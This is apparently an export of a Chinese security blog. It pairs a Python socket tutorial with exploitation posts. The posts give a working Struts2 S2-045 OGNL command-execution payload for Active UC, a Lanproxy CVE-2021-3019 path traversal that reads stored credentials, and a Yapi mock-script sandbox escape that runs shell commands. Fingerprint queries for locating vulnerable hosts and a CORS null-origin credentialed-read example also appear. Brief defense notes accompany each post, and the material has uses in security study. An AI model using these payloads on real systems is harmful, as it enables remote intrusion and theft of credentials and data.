<td align="center">s.send()</td>
<td align="center">发送TCP数据，将string中的数据发送到连接的套接字。返回值是要发送的字节数量</td>
</tr>
<tr>
<td align="center">s.sendall()</td>
<td align="center">完整发送TCP数据，将string中的数据发送到连接的套接字，但是在返回之前尝试发送所有数据。成功则返回None，失败则抛出异常</td>
</tr>
<tr>
<td align="center">s.recvfrom()</td>
<td align="center">接收UDP数据，与recv()类似，但返回值是（data,address）data是包含接收数据的字符串，address是发送数据的套接字地址</td>
</tr>
<tr>
<td align="center">s.sendo()</td>
<td align="center">发送UDP数据，将数据发送到套接字，address是形式为(ipaddr,port)的元组，指定远程地址。返回值是发送的字节数</td>
</tr>
<tr>
<td align="center">s.close()</td>
<td align="center">关闭套接字</td>
</tr>
</tbody></table>
<h2 id="TCP连接"><a href="#TCP连接" class="headerlink" title="TCP连接"></a>TCP连接</h2><p>由于TCP连接具有安全可靠的特性，所以TCP应用更为广泛。创建TCP连接时，主动发起连接的叫客户端，被动响应连接的叫服务器。</p>
<p>TCP连接过程如下</p>
<ol>
<li>使用Socket创建一个套接字</li>
<li>使用bind绑定IP和端口</li>
<li>使用listen使套接字变为被动连接，开始监听</li>
<li>使用accept等待客户端连接</li>
<li>使用recv/send接收和发送数据</li>
</ol>
<div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">TCP服务端</button></li><li class="tab"><button type="button" data-href="#-2">TCP客户端</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">8888</span></span><br><span class="line">web = socket.socket()</span><br><span class="line">web.bind((host,port))</span><br><span class="line"><span class="comment"># 绑定IP和端口</span></span><br><span class="line">web.listen(<span class="number">5</span>)</span><br><span class="line"><span class="comment"># 开始监听</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 等待客户端连接，以元组的形式包含了socket连接信息和监听信息</span></span><br><span class="line">    conn,addr = web.accept()</span><br><span class="line">    <span class="comment"># 接收客户端的数据</span></span><br><span class="line">    data = conn.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="comment"># 向客户端发送数据,&quot;HTTP/1.1 200 OK\r\n\r\n&quot;为返回头部,没有则无法在浏览器中显示</span></span><br><span class="line">    conn.sendall(<span class="string">b&quot;HTTP/1.1 200 OK\r\n\r\nhello,client&quot;</span>)</span><br><span class="line">    <span class="comment"># 关闭套接字</span></span><br><span class="line">    conn.close()</span><br><span class="line">    </span><br><span class="line">hello,server</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">web = socket.socket()</span><br><span class="line">http = (<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">8888</span>)</span><br><span class="line"><span class="comment"># 初始化连接</span></span><br><span class="line">web.connect(http)</span><br><span class="line">send_data = <span class="built_in">input</span>(<span class="string">&quot;请输入要发送的数据：&quot;</span>)</span><br><span class="line"><span class="comment"># 发送数据</span></span><br><span class="line">web.send(send_data.encode())</span><br><span class="line"><span class="comment"># 接收数据</span></span><br><span class="line">recv_data = web.recv(<span class="number">1024</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;接收到的数据为：\r\n&quot;</span>,recv_data)</span><br><span class="line"><span class="comment"># 关闭套接字</span></span><br><span class="line">web.close()</span><br><span class="line"></span><br><span class="line">请输入要发送的数据：hello,server</span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">hello,client</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>



<h2 id="UDP连接"><a href="#UDP连接" class="headerlink" title="UDP连接"></a>UDP连接</h2><p>使用UDP编写简易聊天，只能在一方发送消息后另一方才能回复</p>
<p>使用TCP也可以达到同样的效果，只是使用函数不同</p>
<div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">UDP服务端</button></li><li class="tab"><button type="button" data-href="#-2">UDP客户端</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">web = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">HTTP = (<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">8888</span>)</span><br><span class="line">web.bind(HTTP)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data,addr = web.recvfrom(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;你收到了消息：&quot;</span>,data.decode())</span><br><span class="line">        sand_data = <span class="built_in">input</span>(<span class="string">&quot;请输入你发送的消息：&quot;</span>)</span><br><span class="line">        web.sendto(sand_data.encode(),addr)</span><br><span class="line">        <span class="keyword">if</span> sand_data == <span class="string">&quot;quit&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;断开连接&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;消息发送失败，连接已断开&quot;</span>)</span><br><span class="line">web.close()</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">web = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">HTTP = (<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sand_data = <span class="built_in">input</span>(<span class="string">&quot;请输入你发送的消息：&quot;</span>)</span><br><span class="line">        web.sendto(sand_data.encode(),HTTP)</span><br><span class="line">        <span class="keyword">if</span> sand_data == <span class="string">&quot;quit&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;断开连接&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data,addr = web.recvfrom(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;你收到了消息：&quot;</span>,data.decode())</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;消息发送失败，连接已断开&quot;</span>)</span><br><span class="line"></span><br><span class="line">web.close()</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>

































]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python3</category>
        <category>Python3进阶</category>
      </categories>
      <tags>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title>Active UC index.action远程命令执行漏洞</title>
    <url>//20f03e999316.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>网动统一通信平台 Active UC index.action 存在S2-045远程命令执行漏洞, 通过漏洞可以执行任意命令</p>
<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;网动统一通信平台(Active UC)&quot;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>访问如下路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/acenter/index.action</span><br></pre></td></tr></table></figure>

<p>抓取http请求，修改<code>Content-Type</code>的值为我们构造好的命令执行语句</p>
<p>以下代码中<code>(#cmd=&#39;netstat -an&#39; )</code>的<code>netstat -an</code>是我们执行的命令，可以根据实际环境修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /acenter/index.action HTTP/1.1</span><br><span class="line">Host: xx.xx.xx.xx:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: %&#123;(#_=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;netstat -an&#x27; ).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>

<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gt5yntnvkjj616g0exqcm02.jpg" alt="Active UC index.action远程命令执行漏洞.png"></p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>对<code>Content-Type</code>的值进行检查，对有特征的恶意数据进行过滤</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web应用漏洞</category>
        <category>Active-UC</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Lanproxy任意文件读取-CVE-2021-3019</title>
    <url>//35ae20fe9202.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        Lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面等等）本次Lanproxy 路径遍历漏洞 (CVE-2021-3019)通过../绕过读取任意文件。该漏洞允许目录遍历读取/../conf/config.properties来获取到内部网连接的凭据</p>
<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">header= &quot;Server: LPS-0.1&quot;</span><br></pre></td></tr></table></figure>



<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://file.nioee.com/d/2e81550ebdbd416c933f/">https://file.nioee.com/d/2e81550ebdbd416c933f/</a></p>
<p>只下载服务端<a href="https://file.nioee.com/d/2e81550ebdbd416c933f/files/?p=/proxy-server-0.1.zip">proxy-server-0.1.zip</a></p>
<p>配置文件地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../conf/config.properties</span><br></pre></td></tr></table></figure>

<p>启动服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../bin/startup.bat</span><br><span class="line">../bin/startup.sh</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>访问服务页面管理地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8090</span><br></pre></td></tr></table></figure>

<p>当前页面抓包，访问路径<code>../conf/config.properties</code>(直接访问会报404错)</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gt5vkomujlj611f0badlf02.jpg" alt="Lanproxy目录遍历漏洞.png"></p>
<h3 id="POC下载"><a href="#POC下载" class="headerlink" title="POC下载"></a>POC下载</h3><p><a href="https://github.com/FanqXu/CVE-2021-3019">https://github.com/FanqXu/CVE-2021-3019</a></p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>下载官方补丁</p>
<p><a href="https://github.com/ffay/lanproxy/commits/master">https://github.com/ffay/lanproxy/commits/master</a></p>
<p><a href="https://github.com/hailinz/lanproxy">https://github.com/hailinz/lanproxy</a></p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web应用漏洞</category>
        <category>Lanproxy</category>
      </categories>
      <tags>
        <tag>信息泄露</tag>
        <tag>目录遍历</tag>
      </tags>
  </entry>
  <entry>
    <title>Yapi Mock远程代码执行漏洞</title>
    <url>//6fa5989b4cf9.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><a href="https://github.com/YMFE/yapi">Yapi</a> 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YApi 还为用户提供了优秀的交互体验，开发人员只需利用平台提供的接口数据写入工具以及简单的点击操作就可以实现接口的管理。</p>
<p>YApi接口管理平台远程代码执行0day漏洞，攻击者可通过平台注册用户添加接口，设置mock脚本从而执行任意代码。鉴于该漏洞目前处于0day漏洞利用状态，强烈建议客户尽快采取缓解措施以避免受此漏洞影响</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Yapi &lt;= 1.9.2</p>
<h2 id="FOFA搜索指纹"><a href="#FOFA搜索指纹" class="headerlink" title="FOFA搜索指纹"></a>FOFA搜索指纹</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Fofa:app=&quot;YApi&quot;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>该平台默认开启注册功能，直接注册登录即可</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7rc5vdij60lp0lp41g02.jpg" alt="yapi远程代码执行漏洞1.png"></p>
<p>注册之后新建项目</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7tbt2z8j60xb0fs0su02.jpg" alt="yapi远程代码执行漏洞2.png"></p>
<p>添加接口</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7u3psyvj614u0cdmxo02.jpg" alt="yapi远程代码执行漏洞3.png"></p>
<p>选择高级mock-脚本-开启脚本</p>
<p>把以下代码粘贴到脚本中</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="built_in">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="built_in">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami &amp;&amp; ps -ef&quot;</span>).toString()</span><br></pre></td></tr></table></figure>

<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7zvi0rdj613f0cggm202.jpg" alt="yapi远程代码执行漏洞4.png"></p>
<p>保存代码并预览</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg80lszuwj60my05njra02.jpg" alt="yapi远程代码执行漏洞5.png"></p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>1.Yapi作者已经停止更新，建议禁止用户注册。通过修改 Yapi 项目目录下的 config.json 文件，将 closeRegister 字段修改为 true 并重启服务即可。</p>
<p>2.升级维护版本（非官方）</p>
<p><a href="https://github.com/yapi-pro/yapi">https://github.com/yapi-pro/yapi</a></p>
<p>3.如果没有 Mock 功能的需求，建议关闭 Yapi 的 Mock 功能</p>
<p>4.在 Mock 功能中加入对恶意代码的过滤。找到文件 <code>api/common/postmanLib.js</code> 的第178行，在函数 <code>function sandboxByNode(sandbox = &#123;&#125;, script)</code> 的开始添加一段过滤： <code>const filter = &#39;process|exec|require&#39;; const reg = new RegExp(&quot;[&quot;+filter+&quot;]&quot;, &quot;g&quot;); if(reg.test(script)) &#123; return false; &#125;</code></p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web应用漏洞</category>
        <category>Yapi</category>
      </categories>
      <tags>
        <tag>远程代码执行漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>CORS（跨域资源共享）配置不当</title>
    <url>//d1ef1b19c260.html</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer" />

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> 　　同源策略（SOP）限制了网络应用之间的信息共享，仅允许同域内进行数据共享。这是很久以前就定下的浏览器安全防护措施。但是，随着网络世界的快速发展，在很多应用场景下，我们都需要将信息从一个子域传递到另一个子域，又或者需要在不同域之间传递数据。这其中可能涉及非常敏感且重要的功能，例如将访问令牌和session标识符传递给另一个应用。</p>
<p>　　为了在有SOP的情况下实现跨域通信，开发人员必须使用不同的技术绕过SOP来传递数据。此时，“绕过”既是一个正常的技术问题，又是一个敏感的安全问题。为了在不影响应用安全状态的情况下实现信息共享，HTML5中引入了跨域资源共享（CORS）。但是，很多开发者在使用时没有考虑到其中蕴含安全风险，容易出现配置错误，导致出现安全漏洞。</p>
<p> 　　跨域资源共享（CORS）是一种网络机制，使Web浏览器在受控的情况下通过xmlHttpRequest API执行跨域请求。这些跨域请求具有Origin标头，用于标识发起请求的域。它定义了在Web浏览器和服务器之间使用的协议，以确定是否允许跨域请求。</p>
<h2 id="关键的CORS-header"><a href="#关键的CORS-header" class="headerlink" title="关键的CORS header"></a>关键的CORS header</h2><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>https://www.baidu1.com</span><br></pre></td></tr></table></figure>

<p>指定哪些域可以访问本域的资源。例如，如果baidu1.com想要访问baidu.com的资源，那么开发人员可以用此授予baidu1.com访问baidu.com资源的权限。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br></pre></td></tr></table></figure>

<p>指定浏览器是否将使用请求发送cookie。仅当allow-credentials标头设置为true时，才会发送cookie。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>GET</span><br></pre></td></tr></table></figure>

<p>指定可以使用哪些HTTP请求方法（GET，PUT，DELETE等）来访问资源。开发人员可用其进一步加强控制力，增强安全性。</p>
<h2 id="CORS-基本用法"><a href="#CORS-基本用法" class="headerlink" title="CORS 基本用法"></a>CORS 基本用法</h2><p>　　当 b.com 服务器想要与 a.com 共享资源内容时，它只需要在 HTTP 响应中添加如下响应头。这个响应头告诉浏览器放宽 SOP 限制，允许a.com脚本读取响应内容：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>http://a.com</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br></pre></td></tr></table></figure>



<p>a.com 则可以通过以下Javascript 脚本，跨域读取 b.com 服务器的内容：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">	<span class="keyword">if</span> (xhr.readyState == XMLHttpRequest.DONE) &#123; </span><br><span class="line">		alert(xhr.responseText); </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://b.com/api&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>



<h2 id="常见的错误配置"><a href="#常见的错误配置" class="headerlink" title="常见的错误配置"></a>常见的错误配置</h2><h3 id="Origin-与-Credentials-true-共用"><a href="#Origin-与-Credentials-true-共用" class="headerlink" title="Origin:*与 Credentials:true 共用"></a>Origin:*与 Credentials:true 共用</h3><p>有一些偷懒的程序员，将Access-Control-Allow-Origin设置为允许来自所有域<code>*</code>的跨域请求，实例如下:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /api/index.php</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.baidu.com</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>www.baidu.com</span><br></pre></td></tr></table></figure>

<p>当发送上述请求时，将获得具有Access-Control-Allow-Origin标头设置的响应</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br></pre></td></tr></table></figure>

<p>　　这意味着该站点允许访问来自所有站点的资源，考虑到这种权限过于宽松，CORS又规定，<code>Access-Control-Allow-Origin:*</code>与 <code>Access-Control-Allow-Credentials:true</code> 不能同时使用。所以这种配置是错误的，浏览器不允许这两种配置同时出现，这种配置只能用于共享公开资源。(对于共享公开资源，不应该需要身份认证)，浏览器会对这种误配置报错，所以该配置不能作为漏洞进行利用。</p>
<h3 id="反射-Origin头"><a href="#反射-Origin头" class="headerlink" title="反射 Origin头"></a>反射 Origin头</h3><p>　　根据前面的 CORS基本用法，开发者可以很容易实现与其它单个网站共享数据。假如一个开发者想要与多个网站共享数据，应该如何配置CORS呢？也许直觉告诉你应该如下配置：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>http://a.com, http://c.com</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>http://*.a.com</span><br></pre></td></tr></table></figure>

<p>　　但事实上这两种域名配置是错误的，因为CORS标准规定，<code>Access-Control-Allow-Origin</code>只能配置为单个origin, null或*。如果开发者想要实现同时与多个域名共享域名的需求，则需要专门编写代码或者使用框架来协助动态生成访问控制策略。这种动态生成的做法增加了开发者配置难度，导致实际网络中出现各种不安全的误配置。</p>
<p>　　最简单地动态生成访问控制策略的方法，就是在<code>Access-Control-Allow-Origin</code>中反射请求的Origin值。例如，下面是一个错误 Nginx 配置示例：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">add_header</span> <span class="string">&quot;Access-Control-Allow-Origin&quot;</span> $http_origin;</span><br><span class="line"><span class="attribute">add_header</span> “Access-Control-Allow-Credentials” “<span class="literal">true</span>”;</span><br></pre></td></tr></table></figure>

<p>　　这种配置非常危险，相当于信任任意网站，给攻击者网站敞开了大门。任意攻击者网站可以直接跨域读取其资源内容。</p>
<h3 id="Origin-校验错误"><a href="#Origin-校验错误" class="headerlink" title="Origin 校验错误"></a>Origin 校验错误</h3><p>　　由于前面那种反射 Origin 的做法过于宽松，另一些开发人员试图在生成访问控制策略时校验Origin头，我们发现这个校验过程实际中也出现许多错误。这些错误可以分为四类：</p>
<p><strong>前缀匹配</strong>: 资源服务器在检查请求中Origin值时，只匹配了前缀。例如<code>www.example.com</code> 想要允许<code>example.com</code>访问，但是只做了前缀匹配，导致同时信任了<code>example.com.attack.com</code>的访问，而<code>example.com.attack.com</code> 是攻击者可以控制的网站。</p>
<p><strong>后缀匹配</strong>: 资源服务器在检查请求中Origin值时，只做了后缀匹配。例如<code>www.example.com</code> 想要允许<code>example.com</code>访问，由于后缀匹配出错，导致允许<code>attackexample.com</code>访问。</p>
<p><strong>没有转义’.’</strong>: 例如，<code>example.com</code>想要允许<code>www.example.com</code> 访问时，但正则匹配没有转义’.’，导致允许<code>wwwaexample.com</code>访问。</p>
<p><strong>包含匹配</strong>: 我们还发现有的网站<code>www.example.com</code> 想要允许 <code>example.com</code>，但是Origin校验出错，出现允许<code>ample.com</code>访问。</p>
<h3 id="信任null"><a href="#信任null" class="headerlink" title="信任null"></a>信任null</h3><p>　　CORS协议的一个重要安全前提是跨域请求中的Origin头不能被伪造，这个前提并不是总是成立。Origin头最早被提出用于防御CSRF攻击，它的语法格式在<code>RFC 6564</code>中被定义。<code>RFC 6564</code>规定，如果请求来自隐私敏感上下文时，Origin头的值应该为null，但是它却没有明确界定什么是隐私敏感上下文。</p>
<p>　　CORS协议复用了Origin头，但在CORS标准中同样缺乏对跨域请求Origin中null明确的定义和限制。有些开发者在网站上配置信任 null，用于与本地file页面共享数据，如下所示：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br></pre></td></tr></table></figure>

<p>　　但是事实上，除了本地file页面的跨域请求Origin头为null外，攻击者还可以从任意域下通过<code>iframe sandbox</code>构造Origin为null的跨域请求，如下是一段示意代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">sandbox</span>=<span class="string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> <span class="attr">src</span>=<span class="string">&#x27;data:text/html,&lt;script&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag"></span></span></span><br><span class="line"><span class="string"><span class="tag">var xhr=new XMLHttpRequest();</span></span></span><br><span class="line"><span class="string"><span class="tag">xhr.onreadystatechange = function() &#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">if (xhr.readyState == XMLHttpRequest.DONE) &#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">	alert(xhr.responseText);</span></span></span><br><span class="line"><span class="string"><span class="tag">	&#125;</span></span></span><br><span class="line"><span class="string"><span class="tag">&#125;</span></span></span><br><span class="line"><span class="string"><span class="tag">xhr.open(&quot;GET&quot;, &quot;http://www.test.com/a.php&quot;, true);</span></span></span><br><span class="line"><span class="string"><span class="tag">xhr.withCredentials = true;</span></span></span><br><span class="line"><span class="string"><span class="tag">xhr.send();&lt;/script&gt;&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>　　这就意味着任何配置有<code>Access-Control-Allow-Origin: null</code>和<code>Access-Control-Allow-Credentials:true</code>的网站等同于没有浏览器SOP的保护，都可以被其他任意域以这种方式读取内容。</p>
<h3 id="HTTPS域信任HTTP域"><a href="#HTTPS域信任HTTP域" class="headerlink" title="HTTPS域信任HTTP域"></a>HTTPS域信任HTTP域</h3><p>　　HTTPS协议被设计用于在不安全的中间网络中进行安全通信。即使在中间人网络环境下，攻击者也应该无法读取HTTPS网站的内容。但是如果该HTTPS网站配置了CORS且信任HTTP域，那么中间人攻击者可以先劫持受信任HTTP域，然后通过这个域发送跨域请求到HTTPS网站，间接读取HTTPS域下的受保护内容。</p>
<h3 id="信任自身全部子域"><a href="#信任自身全部子域" class="headerlink" title="信任自身全部子域"></a>信任自身全部子域</h3><p>　　很多网站为了方便会将 CORS 配置为信任全部自身子域，这种配置会导致子域 XSS的危害被强化。为了防止某个子域上XSS漏洞的危害其他子域，浏览器设计了Cookie的<code>httponly</code>标志，用于限制Javascript读取Cookie，因此某个子域XSS不能读取带有<code>httponly</code>标记的Cookie，难以窃取其他重要子域上的敏感内容。 但是如果这个域配置了CORS且信任全部子域，那么攻击者可以利用其他任意子域上XSS漏洞，发送跨域请求到目标重要域网站，从而获取敏感内容。</p>
